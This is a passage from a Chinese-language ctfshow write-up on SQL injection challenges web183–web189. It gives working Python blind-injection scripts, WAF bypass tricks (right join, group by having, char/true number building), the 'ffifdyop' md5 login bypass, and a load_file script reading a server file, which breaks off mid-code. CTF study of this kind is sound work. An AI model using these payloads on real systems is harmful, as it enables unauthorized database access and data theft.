<p><code>select count(pass) from ctfshow_user where pass regexp &#39;ctfshow&#123;&#39;</code>也是返回1的，但是如果你 <code>regexp ctfshow1</code> 很显然就是返回0了。所以我们根据这个特点就可以去写脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://42d2554a-8788-4113-be14-fade50687eb6.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">strs = <span class="string">r&quot;&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">str</span>=<span class="string">&quot;ctfshow&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the second way&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>, <span class="number">46</span>):   <span class="comment">#ctfshow ，所以第8位是从&#123; 开始 。</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment">#&#x27;tableName&#x27;: &quot;(ctfshow_user)where(pass)regexp&#x27;&#123;&#125;&#x27;&quot;.format(str+j)</span></span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;(ctfshow_user)where(pass)like&#x27;&#123;&#125;%&#x27;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span> + j)</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> r.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">str</span> += j</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里的strs&#x3D;<code>r&quot;&quot;</code>，这个r得写，代表转义，不然你直接<code>regexp &#39;ctfshow&#123;&#39; </code>会报错的。在mysql后台测试直接<code>regexp&#39;ctfshow&#123;&#39;</code>会报错，而<code>regexp &#39;ctfshow\\&#123;&#39;</code> 不会。因为转义了。</p>
<p>这里<code>regexp&#39;xx&#39;</code> 和 <code> like &#39;xx%&#39;</code> 是等效的。</p>
<h3 id="反思-8"><a href="#反思-8" class="headerlink" title="反思"></a>反思</h3><p>这个题目真得好好反思下，对SQL语句语法还是不熟悉导致利用不当。</p>
<p>1.比如一开始我一直在想能不能<code> ctfshow_user&quot; &amp;&amp;&quot;1</code> 这种语法就很奇怪，代入进去其实就是<code>select count(pass) from ctfshow_user &amp;&amp; 1</code> 很显然是个错误语法，当然 || 或者 or 1也是一样，</p>
<p>我们在使用or and 这种逻辑时候，前面得有一些条件语句的，比如where 。这里如果我这样写：<code>select count(pass) from ctfshow_user where pass regexp &#39;ctfshow&#39; or 1</code> 这样语法就是正确的，不会报错。</p>
<p>2.看到网上有这样的利用，我个人是没想明白的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">1</span>,<span class="number">46</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">        data=&#123;<span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;(ctfshow_user)where(substr(pass,&#123;&#125;,1)regexp&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i,j)&#125;</span><br><span class="line">        <span class="keyword">if</span> r.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>大概demo就是这样，这个是一位一位去匹配的，这样感觉是不太科学的，比如：</p>
<table>
<thead>
<tr>
<th>pass</th>
</tr>
</thead>
<tbody><tr>
<td>ctfshow{487596-s4dg-96klf}</td>
</tr>
<tr>
<td>ca</td>
</tr>
<tr>
<td>d</td>
</tr>
<tr>
<td>123444444444</td>
</tr>
<tr>
<td>s</td>
</tr>
</tbody></table>
<p>那么这个输出就很看你的字典了。如果你字典顺序为<code>1dxxx</code>，那么第一个输出的就是1，如果你是<code>d1xxx</code>，那么输出的就是d。</p>
<p>3.这个题目一开始拿到就一直想着来盲注，确实是盲注，但是我思路一直停留在and or if 啥的然后结合引号闭合啥的去创造盲注的条件，但其实where本身就是一个条件语句。这里也没有把where过滤掉，我们可以直接用where 。思路还是太单一和局限了。</p>
<h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><p>在183的基础上过滤了：<code>preg_match(&#39;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\</code>|sleep|benchmark&#x2F;i’)&#96;</p>
<h3 id="解法一-9"><a href="#解法一-9" class="headerlink" title="解法一"></a>解法一</h3><p>过滤的更为严苛了，<code>where</code>，引号啥的都不让用了，没有啥思路，看了writeup发现可以利用<code>right join</code> 来注入。</p>
<p>关于<code>right join</code>的介绍，网上找了些相关资料，这里搬运下（侵权可删）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">join(inner join)内连接，如果表中至少有一行匹配，则返回行。(table1和table2的交集)</span><br><span class="line">left join  左连接，会返回左表中所有的行，即使右表中没有匹配。</span><br><span class="line">right join 右连接，会返回右表中所有的行，即使左表中没有匹配。</span><br></pre></td></tr></table></figure>

<p>这个题目可以用右连接，然后用on来做逻辑条件，来实现我们的盲注，可以本地起一个demo看下：</p>
<p><img src="https://img.picgo.net/2024/10/27/ctfshow1842b7ac98aa523f8a5.png" alt="ctfshow184"></p>
<p>可以看这样是可以的，改下脚本的payload就可以跑了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://0b1ba05a-0178-464a-9ed2-706fa5f9096c.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">flagstr = <span class="string">r&quot;&#123;flqazwsx-0123456789edcrvtgbyhnujmikolp&#125;&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">start=<span class="string">&quot;ctfshow&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params">s</span>):</span><br><span class="line">    strs=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        m=<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))</span><br><span class="line">        strs+=<span class="built_in">str</span>(m[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">return</span> strs</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>, <span class="number">46</span>):   <span class="comment">#ctfshow ，所以第8位是从&#123; 开始 。</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment">#&#x27;tableName&#x27;: &quot;(ctfshow_user)where(pass)regexp&#x27;&#123;&#125;&#x27;&quot;.format(str+j)</span></span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass regexp 0x&#123;&#125;&quot;</span>.<span class="built_in">format</span>(str2hex(start+j))</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> r.text.find(<span class="string">&quot;$user_count = 43;&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">            start += j</span><br><span class="line">            <span class="built_in">print</span>(start)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(start)</span><br></pre></td></tr></table></figure>

<p>加了一个简单的字符转16进制的代码。</p>
<h3 id="解法二-7"><a href="#解法二-7" class="headerlink" title="解法二"></a>解法二</h3><p>也是找where的等效替换，一开始通过百度查到<code>group by  xxxx having xxxx </code>的这种用法，但是昨天试的时候不行，今天试着又行了，估计是哪里弄错了。</p>
<p><code>select count(*) from ctfshow_user where pass regexp &#39;c&#39;;</code>  </p>
<p><code>select count(*) from ctfshow_user group by pass having pass regexp &#39;c&#39;;</code>  效果是一样的：</p>
<p><img src="https://img.picgo.net/2024/10/27/web184ba5fe67a9b29282b.png" alt="web184"></p>
<p>所以我们的payload可以换一下，然后对应的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://cf71d4d2-2b5f-41b0-8d2c-bf7e3db392b8.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">flagstr = <span class="string">r&quot;&#123;flqazwsx-0123456789edcrvtgbyhnujmikolp&#125;&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">start=<span class="string">&quot;ctfshow&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params">s</span>):</span><br><span class="line">    strs=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        m=<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))</span><br><span class="line">        strs+=<span class="built_in">str</span>(m[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">return</span> strs</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>, <span class="number">46</span>):   <span class="comment">#ctfshow ，所以第8位是从&#123; 开始 。</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment">#&#x27;tableName&#x27;: &quot;(ctfshow_user)where(pass)regexp&#x27;&#123;&#125;&#x27;&quot;.format(str+j)</span></span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user group by pass having pass regexp 0x&#123;&#125;&quot;</span>.<span class="built_in">format</span>(str2hex(start+j))</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> r.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">            start += j</span><br><span class="line">            <span class="built_in">print</span>(start)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(start)</span><br></pre></td></tr></table></figure>

<p>也是能够成功跑出来的。</p>
<h2 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h2><h3 id="解法一-10"><a href="#解法一-10" class="headerlink" title="解法一"></a>解法一</h3><p>这个题目把数字过滤了，看了下也没撒思路，看了大佬的博客，发现数字有一种替代的方式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">利用 true,pi(),floor(),ceil(),version()这些元素去拼凑出数字。</span><br><span class="line">true 或者 !!pi()  1</span><br><span class="line">true+true         2</span><br><span class="line">floor(pi())       3</span><br><span class="line">ceil(pi())        4</span><br><span class="line">floor(version())  5</span><br><span class="line">ceil(version())   6</span><br><span class="line">ceil(pi()+pi())   7</span><br><span class="line">floor(version()+pi()) 8</span><br><span class="line">floor(pi()*pi())  9</span><br><span class="line">ceil(pi()*pi())  10</span><br></pre></td></tr></table></figure>

<p>然后试着写了一下利用的payload:</p>
<p><img src="https://img.picgo.net/2024/10/27/web185461a4b073e1edcb2.png" alt="web185"></p>
<p>可以看到回显的， 利用mysql语言的<code>concat()</code>结合<code>char()</code>来拼接，可以绕过引号的过滤。但是这样脚本其实不好写，因为每增加一位，我们 <code>regexp</code> 匹配的就会长一位，<code>concat</code>这个函数就会有变化，会多一个<code>char()</code>。实现起来很困难，（其实一点也不困难）看了大哥们的脚本瞬间豁然开朗，在他们的基础上做了一些脚本上面的优化，在<code>createnum</code>和<code>createstr</code>的实现上显得更简洁一些。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createnum</span>(<span class="params">n</span>):</span><br><span class="line">    num=<span class="string">&#x27;true+&#x27;</span>*n</span><br><span class="line">    <span class="keyword">return</span> num[:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createstr</span>(<span class="params">res</span>):</span><br><span class="line">    strs=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span>  res:</span><br><span class="line">        ords=<span class="built_in">ord</span>(s)</span><br><span class="line">        ords=createnum(ords)</span><br><span class="line">        strs=strs+<span class="string">&#x27;char(&#123;&#125;),&#x27;</span>.<span class="built_in">format</span>(ords)</span><br><span class="line">    <span class="keyword">return</span> strs[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://01d38cdf-4bbf-4295-a849-f38296522df5.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">flagstr = <span class="string">r&quot;&#123;flqazwsx-0123456789edcrvtgbyhnujmikolp&#125;&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">start=<span class="string">&quot;ctfshow&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>, <span class="number">46</span>):   <span class="comment">#ctfshow ，所以第8位是从&#123; 开始 。</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment">#&#x27;tableName&#x27;: &quot;(ctfshow_user)where(pass)regexp&#x27;&#123;&#125;&#x27;&quot;.format(str+j)</span></span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user group by pass having pass regexp concat(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(createstr(start+j)),</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> r.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">            start += j</span><br><span class="line">            <span class="built_in">print</span>(start)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(start)</span><br></pre></td></tr></table></figure>

<p>能够成功跑出。</p>
<h3 id="解法二-8"><a href="#解法二-8" class="headerlink" title="解法二"></a>解法二</h3><p>当然这里换成<code>right join</code> 也是一样的效果。改下<code>payload</code>和判断条件就行：</p>
<p><code>&#39;tableName&#39;: &quot;ctfshow_user as a right join ctfshow_user as b on b.pass regexp concat(&#123;&#125;)&quot;.format(createstr(start + j))</code></p>
<p><code>if r.text.find(&quot;$user_count = 43;&quot;) &gt; 0:</code></p>
<h3 id="反思-9"><a href="#反思-9" class="headerlink" title="反思"></a>反思</h3><p>有了思路之后还是很久没有打通，耗了很久。最后听一个师傅说可能是编码的问题，hackbar上URL编码之后才传过去通了。这里很奇怪不知道为啥需要编码一下，当时抓包的时候改了编码的也发现不行。后面分别在hackbar上进行url编码和不进行URL编码，把数据发送过去，然后抓包看到效果图如下：</p>
<p><img src="https://img.picgo.net/2024/10/29/sql185_1512cec741387519f.png" alt="sql185 1"></p>
<p>这个是我们编码之后传过去的，可以看到+和%2B是做了区分的，这里+会在bp里面解析成空格。</p>
<p><img src="https://img.picgo.net/2024/10/29/sql185_2da6d88d521321f6b.png" alt="sql185 2"></p>
<p>这个是我们没有编码的，可以看到+是没有做区分的，这样很显然会有歧义，无法得知+是空格还是运算符。</p>
<p>所以得出结论，需要编码一下。</p>
<h2 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在185的基础上过滤了<code>%、&gt;、&lt;、^</code> 等一些符号。其实对我们185的脚本没啥影响，还是可以直接写。</p>
<h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">查询语句：</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(*) from ctfshow_user where username = &#x27;<span class="subst">$username</span>&#x27; and password= &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">返回逻辑：</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">//只有admin可以获得flag</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名不存在&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>1.为什么不能直接传<code>username=admin&#39;%23</code> 因为底下有个校验逻辑，必须 <code>username == admin</code> 才给返回内容。哪怕这里不做任何过滤，你能带入到SQL语句里面执行，但这里是不以SQL语句执行为真为返回条件的。</p>
<p>2.这里注意，他其实带入SQL语句的是md5($password,true) 。所以我们只要找到一个字符串，他在进行md5，参数为true加密后，能够得到类似于<code>&#39;or&#39;xxxx</code> 这里开头的x一定要是以数字1-9开头。保证非0，然后条件为恒真。</p>
<p>3.登录得到的flag得通过抓包来看，这个其实也是一个经验和套路。</p>
<p>password字段我们传入<code>ffifdyop</code>，加密之后就是<code>&#39;or&#39;6�]��!r,��b</code></p>
<h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"> <span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br><span class="line">   <span class="comment">//用户名检测</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">   <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">   <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//密码检测</span></span><br><span class="line"> <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">   <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">   <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//密码判断</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="title function_ invoke__">intval</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">     <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">     <span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="variable">$flag</span>));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>看了眼，没啥思路，这题目考察的也是一种特性。</p>
<p>1.<code>select * from ctfshow_user where username = 0</code>  会得到所有行。</p>
<p>2.首字母非数字字符串和数字0 <strong>弱比较</strong>结果为真。</p>
<p>3.<code>$row[&#39;pass&#39;]</code>对应 <code>string类型</code> 这题查询出来的应该是只有一行。</p>
<p>payload1: <code>username=0&amp;password=0</code> </p>
<p>payload2:<code>username=1||1&amp;password=0</code></p>
<h2 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br><span class="line"><span class="comment">//用户名检测</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">  &#125; </span><br></pre></td></tr></table></figure>

<p>看<code>$sql</code>语句的话可以发现算是数字型的注入，不需要用<code>&#123; &#125;</code> 之类的来闭合。</p>
<p>这个题整个夺旗的思路是这样的，不是让你去读pass的值，而是告诉你了 flag是在<code>/var/www/html/api/index.php</code> 里面。你去读。</p>
<p>所以分两步：</p>
<p>1.先找到flag值在<code>/var/www/html/api/index.php</code>的位置，利用<code>locate函数</code></p>
<p>2.然后再去盲注出flag的值。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://3893bca0-4d38-4e4f-a333-99de32ea852b.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflagindex</span>():</span><br><span class="line">    head = <span class="number">1</span></span><br><span class="line">    tail = <span class="number">300</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&#x27;if(locate(&quot;ctfshow&quot;,load_file(&quot;/var/www/html/api/index.php&quot;))&gt;<span class="subst">&#123;mid&#125;</span>,0,1)&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;<span class="string">&quot;username&quot;</span>: payload, <span class="string">&quot;password&quot;</span>: <span class="number">1</span>&#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            head = 